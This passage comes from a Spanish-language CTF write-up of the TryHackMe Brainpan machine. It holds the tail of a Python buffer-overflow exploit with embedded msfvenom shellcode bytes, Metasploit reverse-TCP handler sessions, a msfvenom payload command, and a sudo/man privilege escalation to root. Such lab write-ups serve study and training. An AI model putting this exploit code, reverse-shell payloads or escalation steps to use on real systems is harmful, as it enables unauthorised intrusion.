</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb1\x59\x83\xeb\xfc\x31\x43\x15\x03\x43\x15\xd7\x7c\x3a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7c\x98\x7f\xc3\x7d\xc6\xf6\x26\x4c\xd4\x6d\x22\xfd\xe8</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe6\x66\x0e\x83\xab\x92\x01\x24\x01\xbd\x2c\xb5\x1d\xb3</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x78\xe2\x98\x4b\x1b\x9e\xe2\x9f\xfb\x9f\x2c\xd2\xfa</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd8\xfa\x98\x13\xb4\x77\x30\xfb\xb2\xca\x89\xfa\x14\x9d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7a\xbc\xec\xa7\xbd\x48\x41\xa9\xed\x3b\x01\x89\x86\x73</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xaa\x99\x99\x50\x4f\xd0\xee\x6a\x61\x1c\x47\x19\xb5\x69</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x59\xcb\x87\xad\xf6\x32\x28\x20\x06\x73\x8f\xdb\x7d\x8f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf3\x66\x86\x54\x89\xbc\x03\x4a\x29\x36\xb3\xae\xcb\x9b</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x22\x25\xc7\x50\x20\x61\xc4\x67\xe5\x1a\xf0\xec\x08\xcc</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x70\xb6\x2e\xc8\xd9\x6c\x4e\x49\x84\xc3\x6f\x89\x60\xbb</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd5\xc2\x83\xaa\x6a\x2b\x5c\xd3\x36\xbb\x90\x1e\xc9\x3b</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbf\x29\xba\x09\x60\x82\x54\x21\xe9\x0c\xa2\x30\xfd\xae</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7c\xfa\x6e\x51\x7d\xfa\xa7\x96\x29\xaa\xdf\x3f\x52\x21</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\xbf\x87\xdf\x2a\x57\xe8\xb7\x13\xa6\x80\xc5\x63\xb9</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0c\x40\x85\xe9\xfc\x02\x1a\x4a\xad\xe2\xca\x22\xa7\xed</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x35\x52\xc8\x24\x5e\xf9\x27\x90\x36\x96\xde\xb9\xcd\x07</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1e\x14\xa8\x08\x94\x9c\x4c\xc6\x5d\xd5\x5e\x3f\x3a\x15</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x9f\xc0\xaf\x15\xf5\xc4\x79\x42\x61\xc7\x5c\xa4\x2e\x38</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\xb7\x29\xc6\x4a\x81\x42\xf1\xd8\xad\x3c\xfe\x0c\x2d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbd\xa8\x46\x2d\xd5\x0c\x33\x7e\xc0\x52\xee\x13\x59\xc7</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x45\x0d\x40\x7a\x6b\x68\xa6\x25\x94\x5f\xb4\x22\x6a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1d\x93\x8a\x02\xdd\xa3\x2a\xd2\xb7\x23\x7b\xba\x4c\x0b</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x74\x0a\xac\x86\xdd\x02\x27\x47\xaf\xb3\x38\x42\x71\x6d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\x61\xaa\x9e\x43\x0a\x4d\x5f\xb4\x02\x2a\x60\xb4\x2a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4c\x5d\x62\x13\x3a\xa0\xb6\x20\x35\x97\x9b\x01\xdc\xd7</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x88\x52\xf5</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>connect((ip, port))
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><h2 id="prueba-del-exploit">Prueba del exploit</h2>
<p>Pongo en marcha el listener de Metasploit y lanzo el exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use exploit/multi/handler 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload generic/shell_reverse_tcp
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set payload windows/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; show options 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/multi/handler<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Name  Current Setting  Required  Description
</span></span><span style="display:flex;"><span>   ----  ---------------  --------  -----------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   LHOST                      yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Exploit target:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Id  Name
</span></span><span style="display:flex;"><span>   --  ----
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Wildcard Target
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set lhost tun0
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> The following options failed to validate: Value <span style="color:#e6db74">&#39;tun0&#39;</span> is not valid <span style="color:#66d9ef">for</span> option <span style="color:#e6db74">&#39;LHOST&#39;</span>.
</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span>&gt; 
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set lhost vboxnet0 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.56.1:4444 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 192.168.56.101
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.56.1:4444 -&gt; 192.168.56.101:49157<span style="color:#f92672">)</span> at 2023-10-08 00:21:38 +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
</span></span><span style="display:flex;"><span>Server username: usuario-PC<span style="color:#ae81ff">\u</span>suario
</span></span><span style="display:flex;"><span>meterpreter &gt; ls
</span></span><span style="display:flex;"><span>Listing: C:<span style="color:#ae81ff">\b</span>of<span style="color:#ae81ff">\b</span>rainpan
</span></span><span style="display:flex;"><span><span style="color:#f92672">========================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode              Size   Type  Last modified              Name
</span></span><span style="display:flex;"><span>----              ----   ----  -------------              ----
</span></span><span style="display:flex;"><span>100777/rwxrwxrwx  <span style="color:#ae81ff">21190</span>  fil   2023-10-07 23:55:03 +0200  brainpan.exe
</span></span></code></pre></div><p>Como veo que ha sido un exito, preparo un shellcode para linux y ataco a la máquina de TryHackMe.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>tun0 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> EXITFUNC<span style="color:#f92672">=</span>process -b <span style="color:#e6db74">&#34;\x00&#34;</span> -f c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">12</span> compatible encoders
</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">150</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">150</span>
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">150</span> bytes
</span></span><span style="display:flex;"><span>Final size of c file: <span style="color:#ae81ff">657</span> bytes
</span></span><span style="display:flex;"><span>unsigned char buf<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbd\x44\x72\x55\xcf\xd9\xe8\xd9\x74\x24\xf4\x58\x31\xc9&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xb1\x1f\x31\x68\x15\x03\x68\x15\x83\xc0\x04\xe2\xb1\x18&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x5f\x91\x08\x06\xa8\xce\x39\xfb\x04\x7b\xbf\x4b\xcc\xf2&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x5e\x66\x91\x92\xfb\x11\x98\x92\xc9\x59\xf4\xa8\x2d\x9b&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbe\x24\xcc\xf1\xa6\x6e\x5e\x57\x70\x06\xbf\x14\xb3\x98&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xba\x5b\x32\x80\x8a\x2f\xf8\xda\xb0\xd0\x02\x1b\xec\xba&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x02\x71\x09\xb2\xe0\xb4\xd8\x09\x66\x33\x1a\xe8\xda\xd7&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbd\xb9\x22\x91\xc1\xad\x2c\xe1\x48\x2e\xed\x0a\x46\x70&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x0d\xc0\xe6\x0f\x1f\x59\x83\x30\xe7\x4a\xd0\x39\xf9\xf2&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x54\x53\x4a\x07\x55\x24\x2f\xc8\x1d\x27\xcf\x28\x65\x26&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x2f\xab\x95\x92\x2e\xab\x95\xe4\xfd\x2b&#34;</span>;
</span></span></code></pre></div><h2 id="acceso-inicial">Acceso inicial</h2>
<p>Con el exploit preparado, lanzo el listener de Metasploit y lanzo el exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.14.50.184:443 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">1017704</span> bytes<span style="color:#f92672">)</span> to 10.10.115.44
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>10.14.50.184:443 -&gt; 10.10.115.44:56482<span style="color:#f92672">)</span> at 2023-10-08 00:44:54 +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; pwd
</span></span><span style="display:flex;"><span>/home/puck
</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
</span></span><span style="display:flex;"><span>Server username: puck
</span></span><span style="display:flex;"><span>meterpreter &gt; 
</span></span></code></pre></div><p>Tengo acceso a la máquina con el usuario puck. Ahora voy a escalar privilegios.</p>
<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
<p>Pongo la shell en background y utilizo el post exploit de Metasploit para buscar exploits que me permitan escalar privilegios:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; bg
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Backgrounding session 1...
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; use post/multi/recon/local_exploit_suggester
</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; show options 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>post/multi/recon/local_exploit_suggester<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Name             Current Setting  Required  Description
</span></span><span style="display:flex;"><span>   ----             ---------------  --------  -----------
</span></span><span style="display:flex;"><span>   SESSION                           yes       The session to run this module on
</span></span><span style="display:flex;"><span>   SHOWDESCRIPTION  false            yes       Displays a detailed description <span style="color:#66d9ef">for</span> the available exploits
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; set SESSION <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>SESSION <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; run
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.106.98 - Collecting local exploits <span style="color:#66d9ef">for</span> x86/linux...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.106.98 - <span style="color:#ae81ff">186</span> exploit checks are being tried...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.106.98 - exploit/linux/local/su_login: The target appears to be vulnerable.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.106.98 - exploit/linux/local/sudoedit_bypass_priv_esc: The target appears to be vulnerable. Sudo 1.8.5p2.pre.1ubuntu1.1 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running check method <span style="color:#66d9ef">for</span> exploit <span style="color:#ae81ff">58</span> / <span style="color:#ae81ff">58</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.106.98 - Valid modules <span style="color:#66d9ef">for</span> session 1:
</span></span><span style="display:flex;"><span><span style="color:#f92672">============================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#   Name                                                               Potentially Vulnerable?  Check Result</span>
</span></span><span style="display:flex;"><span> -   ----                                                               -----------------------  ------------
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span>   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span>   exploit/linux/local/sudoedit_bypass_priv_esc                       Yes                      The target appears to be vulnerable. Sudo 1.8.5p2.pre.1ubuntu1.1 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
</span></span></code></pre></div><p>Intento usar el exploit <code>exploit/linux/local/su_login</code> pero no funciona. Tampoco lo consigo con el exploit <code>exploit/linux/local/sudoedit_bypass_priv_esc</code>.</p>
<p>Reviso los permisos de sudo:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; shell
</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">1368</span> created.
</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">99</span> created.
</span></span><span style="display:flex;"><span>find / -type f -perm -u<span style="color:#f92672">=</span>s -o -type f -perm -g<span style="color:#f92672">=</span>s 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/bin/umount
</span></span><span style="display:flex;"><span>/bin/su
</span></span><span style="display:flex;"><span>/bin/mount
</span></span><span style="display:flex;"><span>/bin/fusermount
</span></span><span style="display:flex;"><span>/bin/ping6
</span></span><span style="display:flex;"><span>/bin/ping
</span></span><span style="display:flex;"><span>/usr/bin/wall
</span></span><span style="display:flex;"><span>/usr/bin/sudo
</span></span><span style="display:flex;"><span>/usr/bin/chage
</span></span><span style="display:flex;"><span>/usr/bin/crontab
</span></span><span style="display:flex;"><span>/usr/bin/mtr
</span></span><span style="display:flex;"><span>/usr/bin/dotlockfile
</span></span><span style="display:flex;"><span>/usr/bin/newgrp
</span></span><span style="display:flex;"><span>/usr/bin/chsh
</span></span><span style="display:flex;"><span>/usr/bin/mlocate
</span></span><span style="display:flex;"><span>/usr/bin/expiry
</span></span><span style="display:flex;"><span>/usr/bin/bsd-write
</span></span><span style="display:flex;"><span>/usr/bin/sudoedit
</span></span><span style="display:flex;"><span>/usr/bin/chfn
</span></span><span style="display:flex;"><span>/usr/bin/mail-lock
</span></span><span style="display:flex;"><span>/usr/bin/traceroute6.iputils
</span></span><span style="display:flex;"><span>/usr/bin/at
</span></span><span style="display:flex;"><span>/usr/bin/lppasswd
</span></span><span style="display:flex;"><span>/usr/bin/mail-touchlock
</span></span><span style="display:flex;"><span>/usr/bin/passwd
</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
</span></span><span style="display:flex;"><span>/usr/bin/mail-unlock
</span></span><span style="display:flex;"><span>/usr/bin/ssh-agent
</span></span><span style="display:flex;"><span>/usr/sbin/uuidd
</span></span><span style="display:flex;"><span>/usr/sbin/pppd
</span></span><span style="display:flex;"><span>/usr/local/bin/validate
</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
</span></span><span style="display:flex;"><span>/usr/lib/pt_chown
</span></span><span style="display:flex;"><span>/sbin/unix_chkpwd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ sudo -l
</span></span><span style="display:flex;"><span>sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> puck on this host:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User puck may run the following commands on this host:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /home/anansi/bin/anansi_util
</span></span><span style="display:flex;"><span>$ 
</span></span></code></pre></div><p>Veo que el usuario puck puede ejecutar el comando <code>/home/anansi/bin/anansi_util</code> como root sin contraseña. Ejecuto el binario y me encuentro que permite ejecutar algunos comandos como root:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo /home/anansi/bin/anansi_util
</span></span><span style="display:flex;"><span>sudo /home/anansi/bin/anansi_util
</span></span><span style="display:flex;"><span>Usage: /home/anansi/bin/anansi_util <span style="color:#f92672">[</span>action<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Where <span style="color:#f92672">[</span>action<span style="color:#f92672">]</span> is one of:
</span></span><span style="display:flex;"><span>  - network
</span></span><span style="display:flex;"><span>  - proclist
</span></span><span style="display:flex;"><span>  - manual <span style="color:#f92672">[</span>command<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Al ejecutarse con sudo, el binario que le pase al comando manual se ejecutará como root. Mirando en GTFOBins, veo que el comando <code>man</code> puede ejecutarse como root y es posible obtener una shell con el comando <code>!/bin/bash</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /home/anansi/bin/anansi_util manual man
</span></span><span style="display:flex;"><span>sudo /home/anansi/bin/anansi_util manual man
</span></span><span style="display:flex;"><span>No manual entry <span style="color:#66d9ef">for</span> manual
</span></span><span style="display:flex;"><span>WARNING: terminal is not fully functional
</span></span><span style="display:flex;"><span>-  <span style="color:#f92672">(</span>press RETURN<span style="color:#f92672">)</span>!/bin/bash
</span></span><span style="display:flex;"><span>!/bin/bash
</span></span><span style="display:flex;"><span>root@brainpan:/usr/share/man# whoami
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>root
</span></span><span style="display:flex;"><span>root@brainpan:/usr/share/man#
</span></span></code></pre></div><p>Finalmente, obtengo una shell como root gracias a un binario que se ejecuta con sudo sin contraseña debido a un fallo de configuración bastante común en muchos sistemas.</p>
<h2 id="conclusiones">Conclusiones</h2>
<p>Después de haber practicado con el buffer overflow en varias máquinas de TryHackMe, completar esta máquina no ha sido especialmente difícil. Sin embargo, me ha servido para practicar con un entorno más realista y a buscar vulnerabilidades tras haber conseguido acceso inicial a la máquina, todo ello sin recibir ninguna pista por parte de la plataforma. Con esta máquina he acabado el bloque de buffer overflow y ahora voy a empezar con el bloque de Active Directory.</p>
<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
</div>
</article>

    
    <p class="articleTagsContainer">
        <span> </span>
        <strong>Tags:</strong>
        
            <a
                
                class="buttonTag"
                
                href="/tags/buffer-overflow">#Buffer Overflow</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/exploit-development">#Exploit Development</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/gtfobins">#GTFOBins</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/hard">#Hard</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/immunity-debugger">#Immunity Debugger</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/linux">#Linux</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/metasploit">#Metasploit</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/meterpreter">#Meterpreter</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/mona">#Mona</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/privilege-escalation">#Privilege Escalation</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/python">#Python</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/reverse-shell">#Reverse Shell</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/tryhackme">#TryHackMe</a>
        
    </p>






                    </main><footer>
    <hr />


<p><small>
